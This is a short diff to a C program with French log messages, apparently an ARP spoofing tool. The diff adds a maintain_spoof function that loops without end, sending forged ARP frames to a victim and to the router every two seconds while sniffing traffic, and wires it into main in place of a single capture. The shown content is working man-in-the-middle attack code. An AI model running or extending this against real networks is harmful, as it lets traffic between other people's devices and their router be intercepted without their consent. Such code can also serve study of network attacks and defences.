@@ -189,6 +189,21 @@ void sniff_packets(int sock_raw)
     }
 }
 
+void maintain_spoof(int sock_raw,
+                    const t_ethernet_frame *victim_frame,
+                    const t_ethernet_frame *router_frame,
+                    const char *iface)
+{
+    printf("[INFO] Maintien de l'attaque ARP en cours (Ctrl+C pour arrêter)...\n");
+    while (true)
+    {
+        send_arp_frame(sock_raw, victim_frame, iface);
+        send_arp_frame(sock_raw, router_frame, iface);
+        sniff_packets(sock_raw);
+        sleep(2);
+    }
+}
+
 
 
 int main(int argc, char *argv[])
@@ -234,8 +249,7 @@ int main(int argc, char *argv[])
                 t_ethernet_frame frame_r = build_eth_frame(&router_reply);
                 send_arp_frame(sock_raw, &frame_r, iface);
                 printf("[INFO] ARP Reply envoyé au routeur !\n");
-                sniff_packets(sock_raw);
-                break ;
+                maintain_spoof(sock_raw, &frame, &frame_r, iface);
             }
         }
     }
